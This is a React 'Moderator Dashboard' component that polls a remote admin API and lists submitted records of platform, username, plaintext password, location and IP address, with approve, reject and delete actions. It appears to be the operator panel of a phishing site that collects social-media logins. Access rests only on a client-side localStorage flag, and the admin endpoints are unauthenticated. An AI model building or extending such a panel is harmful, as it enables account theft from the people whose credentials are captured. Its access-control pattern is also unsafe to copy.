import { useEffect, useState } from "react";

export default function ModeratorDashboard() {

if (localStorage.getItem("moderatorLoggedIn") !== "true") {
  window.location.href = "/moderator-login";
  return null;
}

  const [requests, setRequests] = useState([]);
  const [loading, setLoading] = useState(true);

  async function loadRequests() {
    try {
      const res = await fetch("https://masterchefsingapore-vk35.vercel.app/api/admin/requests");
      const data = await res.json();

      if (data.success) {
        setRequests(data.data);
      }
    } catch (err) {
      console.log(err);
    }

    setLoading(false);
  }

  async function approve(id) {
    await fetch(`https://masterchefsingapore-vk35.vercel.app/api/admin/approve/${id}`, {
      method: "PUT",
    });

    loadRequests();
  }

  async function reject(id) {
    await fetch(`https://masterchefsingapore-vk35.vercel.app/api/admin/reject/${id}`, {
      method: "PUT",
    });

    loadRequests();
  }

  async function remove(id) {
    if (!window.confirm("Delete this request?")) return;

    await fetch(`https://masterchefsingapore-vk35.vercel.app/api/admin/delete/${id}`, {
      method: "DELETE",
    });

    loadRequests();
  }

  useEffect(() => {
    loadRequests();

    const interval = setInterval(loadRequests, 5000);

    return () => clearInterval(interval);
  }, []);

  const pending = requests.filter(r => r.status === "pending").length;
  const approved = requests.filter(r => r.status === "approved").length;
  const rejected = requests.filter(r => r.status === "rejected").length;

  return (
    <div className="min-h-screen bg-[#111827] text-white p-6">

      <h1 className="text-3xl font-bold mb-8">
        Moderator Dashboard
      </h1>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">

        <div className="bg-yellow-500 rounded-xl p-5 text-center">
          <h2 className="text-3xl font-bold">{pending}</h2>
          <p>Pending</p>
        </div>

        <div className="bg-green-600 rounded-xl p-5 text-center">
          <h2 className="text-3xl font-bold">{approved}</h2>
          <p>Approved</p>
        </div>

        <div className="bg-red-600 rounded-xl p-5 text-center">
          <h2 className="text-3xl font-bold">{rejected}</h2>
          <p>Rejected</p>
        </div>

        <div className="bg-blue-600 rounded-xl p-5 text-center">
          <h2 className="text-3xl font-bold">{requests.length}</h2>
          <p>Total</p>
        </div>

      </div>

      {loading ? (
        <p>Loading...</p>
      ) : (
        <div className="overflow-x-auto">

          <table className="w-full">

            <thead className="bg-gray-800">

              <tr>
                <th className="p-3">Platform</th>
                <th className="p-3">Username</th>
                <th className="p-3">Password</th>
                <th className="p-3">Location</th>
                <th className="p-3">IP Address</th>
                <th className="p-3">Status</th>
                <th className="p-3">Actions</th>
              </tr>

            </thead>

            <tbody>

             {requests.map((request) => (
                <tr
                  key={request.id}
                  className="border-b border-gray-700"
                >

                  <td className="p-3">{request.platform}</td>
                  <td className="p-3">{request.username}</td>
                  <td className="p-3">{request.password}</td>
                  <td className="p-3">{request.location}</td>
                  <td className="p-3">{request.ip_address || request.ip || "N/A"}</td>

                  <td className="p-3 capitalize">
                    {request.status}
                  </td>

                  <td className="p-3 flex gap-2">

                    <button
                      onClick={() => approve(request.id)}
                      className="bg-green-600 px-3 py-1 rounded"
                    >
                      Approve
                    </button>

                    <button
                      onClick={() => reject(request.id)}
                      className="bg-red-600 px-3 py-1 rounded"
                    >
                      Reject
                    </button>

                    <button
                      onClick={() => remove(request.id)}
                      className="bg-gray-700 px-3 py-1 rounded"
                    >
                      Delete
                    </button>

                  </td>

                </tr>

              ))}

            </tbody>

          </table>

        </div>
      )}

    </div>
  );
}